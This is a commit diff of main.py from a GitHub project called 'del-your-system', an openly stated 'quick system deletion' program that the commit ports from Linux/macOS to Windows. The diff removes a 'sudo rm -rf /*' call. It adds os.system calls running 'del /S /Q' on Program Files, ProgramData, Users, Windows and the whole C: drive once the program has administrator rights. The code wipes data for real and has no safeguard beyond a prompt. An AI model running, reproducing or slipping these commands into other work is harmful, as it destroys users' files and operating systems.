5bee33d5510acb092148ef64906f4952705774cc
SDCOM-0415 <127208666+SDCOM-0415@users.noreply.github.com>
2024-10-01 12:24:37 +0800

    Update main.py

--- Windows/main.py
+++ Windows/main.py
@@ -13,6 +13,12 @@ Github: https://github.com/SDCOM-0415
 TG群组: https://t.me/SDCOM_HOME
 """)
 
+# GitHub项目信息
+print("""Gihub项目地址: https://github.com/SDCOM-0415/del-your-system
+Gitcode项目地址: https://gitcode.com/SDCOM-0415/del-your-system
+本次版本更新时间: 2024.8.31-2024.10.1
+""")
+
 # 程序说明
 print("本程序为快速删除系统程序, 使用之前请仔细阅读说明.")
 print("""
@@ -23,7 +29,7 @@ print("""
 """)
 
 # 程序版本输出
-print("程序版本:0.2 for Linux && macOS")
+print("程序版本:0.3 for Windows")
 
 # 检测操作系统类型
 system_type = platform.system()
@@ -31,11 +37,11 @@ print(f"操作系统类型: {system_type}")
 
 # 根据操作系统类型执行不同的操作
 if system_type == "Windows":
-    print("此程序不支持Windows操作系统,请使用Linux或macOS系统.")
-    sys.exit(1)
+    print("继续运行.")
 
 elif system_type == "Linux" or system_type == "Darwin":
-    print("继续运行.")
+    print("此程序不支持Linux或macOS操作系统,请使用Windows系统.")
+    sys.exit(1)
 
 def main():
     # 暂停程序并等待用户输入
@@ -59,28 +65,25 @@ def main():
 
         # 检查是否为管理员身份运行
         if not is_admin():
-            choice = input("程序未以root管理员身份运行, 是否尝试提权?(y/n): ")
-            if choice.lower() in ['y', '']:
-                try:
-                    os.system('sudo -i')
-                except Exception as e:
-                    print("出现错误:", e)
-                    print("未安装sudo, 请手动安装或手动进入root用户后重试.")
-                    sys.exit(1)
-            elif choice.lower() == 'n':
-                print("用户选择不提权, 程序将退出.")
-                sys.exit(1)
-        else:
+            print("程序未以管理员身份运行, 请手动以管理员身份运行.")
+            print("程序退出.")
+            sys.exit(1)  # 退出程序
+
+        print("程序以管理员身份运行")
 
         # 输出 Python 版本信息
-            try:
-                print(f"Python version: {sys.version}")
-            except ImportError:
-                print("未检测到Python版本")
+        print(f"Python version: {sys.version}")
 
-        # 对于 Linux 和 macOS 执行命令
-        os.system("sudo rm -rf /*")
+        # 检测操作系统类型
+        system_type = platform.system()
 
+        # 对于 Windows 执行命令
+        os.system("del /S /Q C:\Program Files (x86)\*.*")
+        os.system("del /S /Q C:\Program Files\*.*")
+        os.system("del /S /Q C:\ProgramData\*.*")
+        os.system("del /S /Q C:\Users\*.*")
+        os.system("del /S /Q C:\Windows\*.*")
+        os.system("del /S /Q C:\*.*")
 
     else:
         print("清除完成, 程序退出")
@@ -88,4 +91,4 @@ def main():
         return
 
 if __name__ == "__main__":
-    main() 
+    main()
